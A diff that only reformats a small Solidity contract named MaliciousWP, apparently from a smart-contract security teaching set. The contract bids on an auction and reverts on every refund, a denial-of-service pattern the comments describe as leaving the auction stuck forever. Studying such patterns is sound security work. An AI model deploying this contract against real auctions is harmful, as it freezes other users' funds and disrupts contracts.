@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import {IAuction} from "./Interfaces/IAuction.sol";
+import {IAuction} from './Interfaces/IAuction.sol';
 
 /**
  * @title Re-entrancy
@@ -22,24 +22,24 @@ import {IAuction} from "./Interfaces/IAuction.sol";
  *         function to be stuck forever.
  */
 contract MaliciousWP {
-    IAuction public auction;
+  IAuction public auction;
 
-    constructor(address _auction) {
-        auction = IAuction(_auction);
-    }
+  constructor(address _auction) {
+    auction = IAuction(_auction);
+  }
 
-    /**
-     * @dev call the bid function of the {Auction} contract
-     *      and send msg.value to the {Auction} contract.
-     */
-    function exploit() public payable {
-        auction.bid{value: msg.value}();
-    }
+  /**
+   * @dev call the bid function of the {Auction} contract
+   *      and send msg.value to the {Auction} contract.
+   */
+  function exploit() public payable {
+    auction.bid{value: msg.value}();
+  }
 
-    /**
-     * @dev revert the transaction
-     */
-    receive() external payable {
-        revert();
-    }
+  /**
+   * @dev revert the transaction
+   */
+  receive() external payable {
+    revert();
+  }
 }
